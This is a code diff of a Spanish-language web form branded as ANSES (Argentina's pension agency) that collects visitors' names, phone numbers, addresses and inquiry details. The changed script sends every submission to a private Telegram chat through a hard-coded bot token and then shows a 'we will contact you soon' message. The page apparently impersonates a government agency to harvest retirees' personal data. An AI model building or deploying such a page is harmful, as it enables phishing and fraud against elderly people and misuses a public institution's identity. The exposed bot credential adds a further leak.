@@ -5,21 +5,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Consulta de Jubilación - ANSES</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </head>
 <body class="min-h-screen flex bg-gray-100">
 
-  <!-- Lado izquierdo con imagen de fondo -->
+  <!-- Imagen lateral -->
   <div class="hidden md:block md:w-1/2 relative">
     <img src="./anses-jubilados-noviembrejpg.webp" alt="Fondo ANSES" class="w-full h-full object-cover" />
-    <!-- Superposición oscura -->
     <div class="absolute inset-0 bg-black bg-opacity-60"></div>
-    <!-- Texto opcional sobre la imagen -->
     <div class="absolute inset-0 flex items-center justify-center">
-      <h2 class="text-white text-3xl font-bold text-center px-6">Consultas sobre Jubilación<br>ANSES</h2>
+      <h2 class="text-white text-3xl font-bold text-center px-6 leading-snug">
+        Consultas sobre Jubilación<br>ANSES
+      </h2>
     </div>
   </div>
 
-  <!-- Lado derecho con formulario -->
+  <!-- Formulario -->
   <div class="w-full md:w-1/2 flex items-center justify-center p-6">
     <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
       <h1 class="text-2xl font-bold text-center text-blue-700 mb-6">Formulario de Consulta</h1>
@@ -46,45 +47,60 @@
           <textarea name="motivo" rows="3" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500"></textarea>
         </div>
 
-        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-xl hover:bg-blue-700">Enviar Consulta</button>
+        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-xl hover:bg-blue-700">
+          Enviar Consulta
+        </button>
       </form>
-
-      <p id="respuesta" class="text-center mt-4 text-sm text-green-600 hidden">✅ Consulta enviada con éxito.</p>
     </div>
   </div>
 
+  <!-- SCRIPT: Telegram + SweetAlert -->
   <script>
-    const TOKEN = "TU_BOT_TOKEN"; // reemplaza con tu token
-    const CHAT_ID = "TU_CHAT_ID"; // reemplaza con tu chat_id
+    const TOKEN = "7738205754:AAGCrVwdl7Ls_jNb-bpBX_c6xxQv5NOYK6Y"; // ← Reemplaza con tu token del Bot de BotFather
+    const CHAT_ID = "-4774402515"; // ← Reemplaza con tu chat_id
 
     const form = document.getElementById('consultaForm');
-    const respuesta = document.getElementById('respuesta');
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const datos = new FormData(form);
       const mensaje = `
-📬 *Nueva consulta ANSES*
-👤 Nombre: ${datos.get('nombre')} ${datos.get('apellido')}
-📞 Teléfono: ${datos.get('telefono')}
-🏠 Dirección: ${datos.get('direccion')}
-📝 Motivo: ${datos.get('motivo')}
+📬 *Nueva Consulta de Jubilación*
+👤 *Nombre:* ${datos.get('nombre')} ${datos.get('apellido')}
+📞 *Teléfono:* ${datos.get('telefono')}
+🏠 *Dirección:* ${datos.get('direccion')}
+📝 *Motivo:* ${datos.get('motivo')}
       `;
 
       const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-      await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: mensaje,
-          parse_mode: 'Markdown'
-        })
-      });
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+          })
+        });
 
-      respuesta.classList.remove('hidden');
-      form.reset();
+        Swal.fire({
+          icon: 'success',
+          title: 'Gracias por su consulta',
+          text: 'Pronto nos pondremos en contacto con usted.',
+          confirmButtonColor: '#2563eb',
+        });
+
+        form.reset();
+      } catch (error) {
+        Swal.fire({
+          icon: 'error',
+          title: 'Error al enviar',
+          text: 'No se pudo enviar la consulta. Intente nuevamente más tarde.',
+          confirmButtonColor: '#dc2626',
+        });
+      }
     });
   </script>
 </body>
